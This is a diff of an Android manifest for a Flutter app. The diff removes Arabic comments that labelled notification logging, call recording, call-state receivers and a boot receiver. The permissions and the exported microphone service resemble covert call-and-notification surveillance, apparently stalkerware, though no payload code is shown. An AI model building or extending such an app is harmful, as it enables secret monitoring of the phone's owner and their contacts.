@@ -1,7 +1,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.example.installing_package">
 
-    <!-- الصلاحيات -->
+
     <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" tools:ignore="ProtectedPermissions" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
@@ -41,7 +41,6 @@
             android:name="flutterEmbedding"
             android:value="2" />
 
-        <!-- الخدمة التي تسجل الإشعارات -->
         <service
             android:name=".NotificationService"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
@@ -51,14 +50,12 @@
             </intent-filter>
         </service>
 
-        <!-- تسجيل المكالمات -->
         <service
             android:name=".CallRecordingService"
             android:enabled="true"
             android:exported="true"
             android:foregroundServiceType="microphone" />
 
-        <!-- استقبال حالة المكالمات -->
         <receiver
             android:name=".CallReceiver"
             android:enabled="true"
@@ -68,7 +65,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- استقبال حدث الإشعارات -->
         <receiver
             android:name=".NotificationReceiver"
             android:enabled="true"
@@ -78,7 +74,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- استقبال إعادة التشغيل -->
         <receiver
             android:name=".BootReceiver"
             android:enabled="true"
@@ -90,7 +85,6 @@
 
     </application>
 
-    <!-- تعريف صلاحيات Query -->
     <queries>
         <intent>
             <action android:name="android.intent.action.PROCESS_TEXT" />
